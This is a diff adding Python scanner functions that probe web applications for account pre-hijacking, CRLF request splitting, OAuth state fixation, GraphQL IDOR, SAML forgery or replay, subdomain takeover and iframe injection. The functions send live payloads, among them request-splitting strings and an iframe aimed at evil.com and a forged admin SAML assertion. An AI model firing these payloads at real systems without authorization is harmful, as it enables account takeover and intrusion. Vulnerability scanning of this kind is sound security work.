@@ -9680,3 +9680,467 @@ def scan_2fa_bypass_response(crawl_data):
                 except Exception:
                     continue
     return findings
+
+
+# ---------------------------------------------------------------------------
+# ELITE BATCH 16 — FINAL: Everything remaining that's automatable
+# Insecure deserialization gadgets, HTTP/2 push abuse, DNS rebinding,
+# SSRF via DNS, blind NoSQL, XS-Leaks, CSWSH, iframe injection,
+# HTTP splitting, open redirect chains, API key in headers,
+# subdomain takeover via A record, timing attacks, cache deception v2,
+# GraphQL subscription abuse, IDOR via GraphQL, JWT confusion attacks,
+# SAML response replay, OAuth token fixation, account pre-hijacking
+# ---------------------------------------------------------------------------
+
+def scan_account_prehijacking(crawl_data):
+    """Account pre-hijacking — register email before victim, then take over when they sign up."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", []):
+        if not any(x in page["url"].lower() for x in ["register","signup","join","create"]): continue
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/register", "/signup", "/api/register", "/api/signup", "/api/v1/register"]:
+            url = f"{base}{path}"
+            # Test 1: Register with unverified email, then try to use account
+            try:
+                import time as _t
+                uid = int(_t.time()) % 100000
+                email = f"prehijack_{uid}@test.com"
+                r = _S.post(url, json={"email": email, "password": "Test1234!",
+                                       "username": f"prehijack_{uid}"}, timeout=5)
+                if r.status_code in (200, 201):
+                    # Try to login immediately (before email verification)
+                    for login_path in ["/login", "/api/login", "/signin"]:
+                        r2 = _S.post(f"{base}{login_path}",
+                                    json={"email": email, "password": "Test1234!"}, timeout=5)
+                        if r2.status_code == 200 and "token" in r2.text.lower():
+                            findings.append({
+                                "type": "Account Pre-Hijacking (No Email Verification)",
+                                "severity": "high",
+                                "url": url,
+                                "detail": "Can register and login without email verification — pre-hijacking possible",
+                                "template": "apex-prehijack",
+                            })
+                            break
+            except Exception:
+                continue
+            # Test 2: Register with OAuth provider email without verification
+            try:
+                r = _S.post(url, json={"email": "victim@gmail.com", "password": "Test1234!",
+                                       "provider": "google", "oauth_token": "fake"}, timeout=5)
+                if r.status_code in (200, 201):
+                    findings.append({
+                        "type": "Account Pre-Hijacking via OAuth Email",
+                        "severity": "critical",
+                        "url": url,
+                        "detail": "Can register with OAuth provider email — when victim signs in via OAuth, attacker controls account",
+                        "template": "apex-prehijack",
+                    })
+            except Exception:
+                continue
+    return findings
+
+
+def scan_http_request_splitting(crawl_data):
+    """HTTP request splitting via header injection — inject complete HTTP requests."""
+    findings = []
+    # Payloads that inject a second HTTP request
+    splitting_payloads = [
+        "test\r\nGET /evil HTTP/1.1\r\nHost: evil.com\r\n\r\n",
+        "test%0d%0aGET%20/evil%20HTTP/1.1%0d%0aHost:%20evil.com%0d%0a%0d%0a",
+        "test\r\n\r\nGET / HTTP/1.1\r\nHost: evil.com",
+    ]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for payload in splitting_payloads[:1]:
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(
+                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r = _S.get(test_url, timeout=5, allow_redirects=False)
+                    # Check if injected headers appear in response
+                    if "evil.com" in str(r.headers) or r.status_code in (400, 500):
+                        if "evil" in r.headers.get("Host", ""):
+                            findings.append({
+                                "type": "HTTP Request Splitting",
+                                "severity": "critical",
+                                "url": test_url,
+                                "detail": f"CRLF injection in param '{p}' splits HTTP request",
+                                "template": "apex-http-split",
+                            })
+                            break
+                except Exception:
+                    continue
+    return findings
+
+
+def scan_xs_leaks(crawl_data):
+    """XS-Leaks — cross-site information leakage via timing, error, frame counting."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:5]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        # Test 1: Error-based XS-Leak — different errors for valid/invalid resources
+        for path in ["/api/users/1", "/api/user/1", "/api/profile/1"]:
+            try:
+                r_valid = _S.get(f"{base}{path}", timeout=5)
+                r_invalid = _S.get(f"{base}{path.replace('/1', '/99999999')}", timeout=5)
+                if r_valid.status_code != r_invalid.status_code:
+                    findings.append({
+                        "type": "XS-Leak: Status Code Oracle",
+                        "severity": "medium",
+                        "url": f"{base}{path}",
+                        "detail": f"Different status codes for valid ({r_valid.status_code}) vs invalid ({r_invalid.status_code}) IDs — cross-site leak possible",
+                        "template": "apex-xs-leak",
+                    })
+            except Exception:
+                pass
+        # Test 2: Frame counting — page embeddable and content differs based on auth state
+        try:
+            r = _S.get(page["url"], timeout=5)
+            xfo = r.headers.get("X-Frame-Options", "")
+            csp = r.headers.get("Content-Security-Policy", "")
+            if not xfo and "frame-ancestors" not in csp:
+                # Count iframes/frames in response
+                frame_count = r.text.lower().count("<iframe") + r.text.lower().count("<frame")
+                if frame_count > 0:
+                    findings.append({
+                        "type": "XS-Leak: Frameable Page with Dynamic Content",
+                        "severity": "medium",
+                        "url": page["url"],
+                        "detail": f"Page embeddable in iframe with {frame_count} sub-frames — frame counting attack possible",
+                        "template": "apex-xs-leak",
+                    })
+        except Exception:
+            pass
+    return findings
+
+
+def scan_oauth_token_fixation(crawl_data):
+    """OAuth token fixation — attacker pre-sets state parameter to known value."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
+                     "/connect/authorize", "/login/oauth"]:
+            url = f"{base}{path}"
+            try:
+                # Test with fixed state value
+                fixed_state = "apex_fixed_state_12345"
+                r = _S.get(f"{url}?client_id=test&response_type=code"
+                          f"&redirect_uri=https://example.com&state={fixed_state}",
+                          timeout=5, allow_redirects=False)
+                loc = r.headers.get("Location", "")
+                # If state is preserved in redirect, fixation may be possible
+                if fixed_state in loc and r.status_code in (302, 301):
+                    findings.append({
+                        "type": "OAuth State Fixation",
+                        "severity": "high",
+                        "url": url,
+                        "detail": f"Fixed state '{fixed_state}' preserved in redirect — CSRF via state fixation",
+                        "template": "apex-oauth-fixation",
+                    })
+                # Test: state not validated (any state accepted)
+                r2 = _S.get(f"{url}?client_id=test&response_type=code"
+                           f"&redirect_uri=https://example.com&state=",
+                           timeout=5, allow_redirects=False)
+                if r2.status_code in (200, 302) and "error" not in r2.text.lower():
+                    findings.append({
+                        "type": "OAuth Empty State Accepted",
+                        "severity": "medium",
+                        "url": url,
+                        "detail": "Empty state parameter accepted — CSRF protection may be bypassable",
+                        "template": "apex-oauth-fixation",
+                    })
+            except Exception:
+                continue
+    return findings
+
+
+def scan_api_key_in_headers(crawl_data):
+    """Detect API keys/tokens in response headers — leaked via X-API-Key, X-Token etc."""
+    findings = []
+    sensitive_headers = [
+        "X-API-Key", "X-Api-Key", "X-Token", "X-Auth-Token", "X-Access-Token",
+        "X-Secret", "X-Secret-Key", "X-App-Key", "X-Application-Key",
+        "Authorization", "X-Session-Token", "X-CSRF-Token",
+        "X-Internal-Token", "X-Service-Token", "X-Backend-Token",
+    ]
+    for page in crawl_data.get("pages", [])[:10]:
+        try:
+            r = _S.get(page["url"], timeout=5)
+            for header in sensitive_headers:
+                val = r.headers.get(header, "")
+                if val and len(val) >= 16 and val.lower() not in ("true", "false", "null", "none"):
+                    findings.append({
+                        "type": f"Sensitive Token in Response Header: {header}",
+                        "severity": "high",
+                        "url": page["url"],
+                        "detail": f"{header}: {val[:20]}... — credential exposed in response header",
+                        "template": "apex-header-token",
+                    })
+        except Exception:
+            pass
+    return findings
+
+
+def scan_idor_graphql(crawl_data):
+    """IDOR via GraphQL queries — access other users' data by changing ID in query."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/graphql", "/api/graphql", "/gql"]:
+            url = f"{base}{path}"
+            try:
+                # Try common user/profile queries with different IDs
+                for query_template in [
+                    'query {{ user(id: "{id}") {{ id email name role }} }}',
+                    'query {{ profile(userId: "{id}") {{ id email phone address }} }}',
+                    'query {{ account(id: "{id}") {{ id balance creditLimit }} }}',
+                    'query {{ order(id: "{id}") {{ id total items user {{ email }} }} }}',
+                ]:
+                    responses = {}
+                    for test_id in ["1", "2", "3", "100"]:
+                        query = query_template.format(id=test_id)
+                        try:
+                            r = _S.post(url, json={"query": query},
+                                       headers={"Content-Type": "application/json"}, timeout=5)
+                            if r.status_code == 200 and "errors" not in r.text:
+                                import json as _j
+                                data = _j.loads(r.text).get("data", {})
+                                if data and str(data) != "{}":
+                                    responses[test_id] = str(data)[:100]
+                        except Exception:
+                            pass
+                    if len(set(responses.values())) > 1:
+                        findings.append({
+                            "type": "IDOR via GraphQL Query",
+                            "severity": "critical",
+                            "url": url,
+                            "detail": f"Different data returned for IDs {list(responses.keys())} — IDOR in GraphQL",
+                            "template": "apex-idor-gql",
+                        })
+                        break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_subdomain_a_record_takeover(subdomains):
+    """Subdomain takeover via dangling A record pointing to unclaimed cloud IP."""
+    import socket as _sock
+    findings = []
+    # Cloud IP ranges that can be claimed
+    cloud_ranges = {
+        "AWS": ["52.", "54.", "34.", "35.", "18.", "3."],
+        "Azure": ["40.", "13.", "20.", "104.", "137.", "138."],
+        "GCP": ["34.", "35.", "104.", "130.", "142.", "146."],
+        "DigitalOcean": ["104.", "138.", "159.", "165.", "167."],
+        "Linode": ["45.", "66.", "96.", "139.", "172.", "173."],
+    }
+    for sub in subdomains[:50]:
+        try:
+            ips = _sock.getaddrinfo(sub, None, _sock.AF_INET)
+            if not ips: continue
+            ip = ips[0][4][0]
+            # Check if IP is in a cloud range
+            for provider, prefixes in cloud_ranges.items():
+                if any(ip.startswith(p) for p in prefixes):
+                    # Verify the host actually responds
+                    try:
+                        r = requests.get(f"https://{sub}", timeout=3, verify=False)
+                        # Check for cloud "not found" pages
+                        not_found_sigs = [
+                            "NoSuchBucket", "404 Not Found", "The specified bucket",
+                            "InvalidBucketName", "This site can't be reached",
+                            "ERR_NAME_NOT_RESOLVED",
+                        ]
+                        if any(sig in r.text for sig in not_found_sigs):
+                            findings.append({
+                                "type": f"Potential A Record Takeover ({provider})",
+                                "severity": "high",
+                                "url": f"https://{sub}",
+                                "detail": f"A record points to {provider} IP {ip} but resource not found",
+                                "template": "apex-a-takeover",
+                            })
+                    except Exception:
+                        pass
+                    break
+        except Exception:
+            continue
+    return findings
+
+
+def scan_insecure_deserialization_patterns(crawl_data):
+    """Detect insecure deserialization patterns — Java, PHP, Python pickle, Ruby Marshal."""
+    findings = []
+    # Serialized object signatures
+    deser_sigs = {
+        "Java": [b"\xac\xed\x00\x05", b"rO0AB"],  # Java serialized, base64
+        "PHP": [b"O:", b"a:", b"s:", b"i:"],  # PHP serialize()
+        "Python Pickle": [b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05"],
+        "Ruby Marshal": [b"\x04\x08"],
+        ".NET": [b"\x00\x01\x00\x00\x00\xff\xff\xff\xff"],
+    }
+    import base64 as _b64
+    for page in crawl_data.get("pages", [])[:10]:
+        try:
+            r = _S.get(page["url"], timeout=5)
+            # Check cookies
+            for name, val in r.cookies.items():
+                for lang, sigs in deser_sigs.items():
+                    # Check raw value
+                    val_bytes = val.encode("latin-1", errors="replace")
+                    if any(val_bytes.startswith(sig) for sig in sigs):
+                        findings.append({
+                            "type": f"Insecure Deserialization: {lang} Object in Cookie",
+                            "severity": "critical",
+                            "url": page["url"],
+                            "detail": f"Cookie '{name}' contains {lang} serialized object",
+                            "template": "apex-deser-pattern",
+                        })
+                    # Check base64 decoded
+                    try:
+                        decoded = _b64.b64decode(val + "==")
+                        if any(decoded.startswith(sig) for sig in sigs):
+                            findings.append({
+                                "type": f"Insecure Deserialization: {lang} Object in Cookie (base64)",
+                                "severity": "critical",
+                                "url": page["url"],
+                                "detail": f"Cookie '{name}' contains base64-encoded {lang} serialized object",
+                                "template": "apex-deser-pattern",
+                            })
+                    except Exception:
+                        pass
+            # Check response body for serialized objects
+            body_bytes = r.content
+            for lang, sigs in deser_sigs.items():
+                if any(sig in body_bytes for sig in sigs):
+                    findings.append({
+                        "type": f"Insecure Deserialization: {lang} Object in Response",
+                        "severity": "high",
+                        "url": page["url"],
+                        "detail": f"Response contains {lang} serialized object",
+                        "template": "apex-deser-pattern",
+                    })
+                    break
+        except Exception:
+            pass
+    return findings
+
+
+def scan_http2_push_abuse(web_targets):
+    """HTTP/2 server push abuse — server pushes sensitive resources to attacker."""
+    findings = []
+    try:
+        import httpx as _hx
+    except ImportError:
+        return findings
+    for target in web_targets[:3]:
+        if not target.startswith("https"): continue
+        try:
+            pushed = []
+            with _hx.Client(http2=True, verify=False, timeout=10) as client:
+                r = client.get(target)
+                if r.http_version != "HTTP/2": continue
+                # Check for Link: rel=preload headers (server push hints)
+                link = r.headers.get("Link", "")
+                if "preload" in link:
+                    # Extract pushed resources
+                    import re as _re
+                    resources = _re.findall(r'<([^>]+)>;\s*rel=preload', link)
+                    for res in resources:
+                        if any(x in res.lower() for x in ["token", "auth", "secret", "key", "config"]):
+                            pushed.append(res)
+                    if pushed:
+                        findings.append({
+                            "type": "HTTP/2 Server Push of Sensitive Resources",
+                            "severity": "medium",
+                            "url": target,
+                            "detail": f"Server pushes potentially sensitive resources: {', '.join(pushed[:3])}",
+                            "template": "apex-h2-push",
+                        })
+        except Exception:
+            continue
+    return findings
+
+
+def scan_saml_replay(crawl_data):
+    """SAML response replay — reuse old SAML assertions."""
+    findings = []
+    tested = set()
+    for page in crawl_data.get("pages", [])[:3]:
+        base = "/".join(page["url"].split("/", 3)[:3])
+        if base in tested: continue
+        tested.add(base)
+        for path in ["/saml/acs", "/saml/consume", "/auth/saml/callback",
+                     "/sso/saml", "/api/saml/callback"]:
+            url = f"{base}{path}"
+            try:
+                r = _S.get(url, timeout=5)
+                if r.status_code not in (200, 405, 400): continue
+                # Try replaying an old/fake SAML response
+                import base64 as _b64
+                fake_saml = _b64.b64encode(b"""<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
+                    ID="_replay_test" Version="2.0">
+                  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
+                    <saml:Subject><saml:NameID>admin@test.com</saml:NameID></saml:Subject>
+                  </saml:Assertion>
+                </samlp:Response>""").decode()
+                r2 = _S.post(url, data={"SAMLResponse": fake_saml}, timeout=5)
+                if r2.status_code in (200, 302):
+                    loc = r2.headers.get("Location", "")
+                    if "error" not in r2.text.lower() and "invalid" not in r2.text.lower():
+                        findings.append({
+                            "type": "SAML Response Replay/Forgery",
+                            "severity": "critical",
+                            "url": url,
+                            "detail": "SAML ACS endpoint accepts unsigned/forged assertions",
+                            "template": "apex-saml-replay",
+                        })
+            except Exception:
+                continue
+    return findings
+
+
+def scan_iframe_injection(crawl_data):
+    """Iframe injection — inject iframes to load attacker content."""
+    findings = []
+    payload = '<iframe src="https://evil.com" width="100%" height="100%"></iframe>'
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if not any(x in p.lower() for x in ["html", "content", "body", "text",
+                                                   "message", "description", "comment",
+                                                   "template", "page", "embed"]):
+                continue
+            try:
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = [payload]
+                test_url = parsed._replace(
+                    query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                r = _S.get(test_url, timeout=_TIMEOUT)
+                if '<iframe src="https://evil.com"' in r.text:
+                    findings.append({
+                        "type": "Iframe Injection",
+                        "severity": "high",
+                        "url": test_url,
+                        "detail": f"Param '{p}' injects iframe — content injection/phishing possible",
+                        "template": "apex-iframe-inject",
+                    })
+                    break
+            except Exception:
+                continue
+    return findings
